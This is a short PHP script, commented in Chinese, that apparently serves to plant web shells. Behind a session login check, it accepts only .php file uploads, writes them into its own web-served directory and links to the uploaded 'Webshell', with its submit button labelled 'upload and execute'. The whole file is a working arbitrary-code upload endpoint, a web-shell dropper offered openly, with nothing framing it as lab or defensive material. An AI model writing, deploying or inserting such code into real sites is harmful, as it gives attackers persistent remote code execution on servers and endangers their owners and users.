<?php
session_start();

// ✅ 检查是否登录
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    header("Location: ../admin/login.php");
    exit;
}

// 处理文件上传
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['shell'])) {
    $originalName = $_FILES['shell']['name'];
    $targetDir = __DIR__;
    $targetFile = $targetDir . '/' . basename($originalName);

    // 只允许上传 .php 文件
    $ext = strtolower(pathinfo($originalName, PATHINFO_EXTENSION));
    if ($ext !== 'php') {
        echo "<h2>❌ 只允许上传 PHP 文件！</h2>";
    } else {
        if (move_uploaded_file($_FILES['shell']['tmp_name'], $targetFile)) {
            echo "<h2>✅ Webshell 上传成功！</h2>";
            $webFilename = basename($originalName);
            echo "<p>🔗 <a href='/$webFilename'>访问你的 Webshell</a></p>";
        } else {
            echo "<h2>❌ 上传失败！</h2>";
        }
    }
} else {
    // 显示上传表单
    ?>
    <h2>📤 上传 PHP Webshell</h2>
    <form method="POST" enctype="multipart/form-data">
      <input type="file" name="shell" accept=".php" required /><br/><br/>
      <input type="submit" value="🚀 上传并执行" />
    </form>
    <?php
}
?>
